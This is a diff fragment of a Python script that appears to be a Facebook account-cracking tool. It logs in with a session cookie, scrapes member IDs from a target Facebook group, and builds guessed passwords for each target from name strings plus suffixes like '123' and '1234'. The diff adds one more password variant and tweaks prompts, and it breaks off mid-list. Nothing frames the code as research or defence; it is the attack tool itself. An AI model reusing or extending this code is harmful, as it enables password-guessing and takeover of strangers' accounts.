@@ -32,7 +32,7 @@ def masuk():
         try:
                 cek = open("cookies").read()
         except FileNotFoundError:
-                cek = input("[\033[1;32m>\033[0m \033[1;93mENTER COOKIE\033[0m >>>> ")
+                cek = input("[\033[1;93mENTER COOKIE\033[0m >>>> ")
         cek = {"cookie":cek}
         ismi = ses.get(mbasic.format("/me",verify=False),cookies=cek).content
         if "mbasic_logout_button" in str(ismi):
@@ -189,7 +189,7 @@ if __name__ == '__main__':
                         if len(username) == 0:
                                 exit("# no result")
                 elif tanya == '4':
-                        print(" \033[1;93mcan only take 1000 IDs033[0m ")
+                        print(" \033[1;93mcan only take 100 IDs\033[0m ")
                         grab = input(" \033[1;93mID group\033[0m : ")
                         username = grubid(mbasic.format("/browse/group/members/?id=" + grab))
                         if len(username) == 0:
@@ -243,6 +243,7 @@ if __name__ == '__main__':
                                 for x in ss:
                                         listpass = [
                                                 str(x) + '123',
+                                                str(x) + '1234',
                                                 str(x) + '12345',
                                                 str(x) + '123456',
                                                 str(x) + '12',
